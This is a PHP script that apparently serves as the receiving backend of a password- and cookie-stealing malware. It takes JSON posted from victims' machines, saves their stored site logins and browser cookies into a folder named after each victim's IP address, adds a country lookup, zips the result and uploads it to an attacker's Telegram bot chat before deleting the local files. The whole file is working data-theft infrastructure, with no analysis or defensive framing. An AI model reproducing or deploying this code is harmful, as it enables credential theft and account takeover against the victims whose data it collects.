<?php

header ("Content-Type: text/html; charset=utf-8");
@ini_set('max_execution_time', 0);
$json = file_get_contents( 'php://input' );
$ip = $_SERVER["REMOTE_ADDR"];
$telegrambottoken = "TELEGRAMBOTTOKEN";
$chatid = "CHATID";

mkdir($ip);
$countCookies = 0;

foreach(json_decode($json, true) as $k1=>$v1) {
  foreach($v1 as $k2=>$v2) {
    switch($k2) {
    case 'Passwords':
      foreach($v2 as $k3=>$v3) {
        foreach($v3 as $k4=>$v4) {
          switch ($k4) {
          case 'Url':
            file_put_contents($ip.'/Passwords.txt', $k4.' : '.$v4."\n", FILE_APPEND);
            break;
          case 'Username':
            file_put_contents($ip.'/Passwords.txt', $k4.' : '.$v4."\n", FILE_APPEND);
            break;
          case 'Pass':
            file_put_contents($ip.'/Passwords.txt', $k4.' : '.$v4."\n"."\n", FILE_APPEND);
            break;
          }
        }
      }
      break;
    case 'Cookies':
      foreach($v2 as $k3=>$v3) {
        foreach($v3 as $k4=>$v4) {
          foreach($v4 as $k5=>$v5) {
            file_put_contents($ip.'/Cookies'.$countCookies.'.txt', $v5, FILE_APPEND);
          }
        }
        $countCookies++;
      }
      break;
    }
  }
}

require_once('pclzip.lib.php');
require_once('geoip.php');

$archive = new PclZip($ip.'.zip');
$archive->create($ip.'/');

if (file_exists($ip.'.zip'))
{
	$country = ip_name($ip);
	if ($size < 104857600) {
		tsendfile($ip.'.zip', $telegrambottoken, $chatid, "IP ".$ip."\nCountry: ".$country);
		unlink($ip.'.zip');
        rrmdir($ip);
	}
}

function rrmdir($src) {
    $dir = opendir($src);
    while(false !== ( $file = readdir($dir)) ) {
        if (( $file != '.' ) && ( $file != '..' )) {
            $full = $src . '/' . $file;
            if ( is_dir($full) ) {
                rrmdir($full);
            }
            else {
                unlink($full);
            }
        }
    }
    closedir($dir);
    rmdir($src);
}

function get($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    $output = curl_exec($ch); 
    curl_close($ch);      
		return ($output);
}

function tsendfile($pach, $bottoken, $cid, $text)
{
    $url = "https://api.telegram.org/bot" . $bottoken . "/sendDocument";
    $_document = $pach;
    $document = new CURLFile(realpath($_document));
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ["chat_id" => $cid, "document" => $document, "caption" => $text]);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    $out = curl_exec($ch);
    curl_close($ch);
}

?>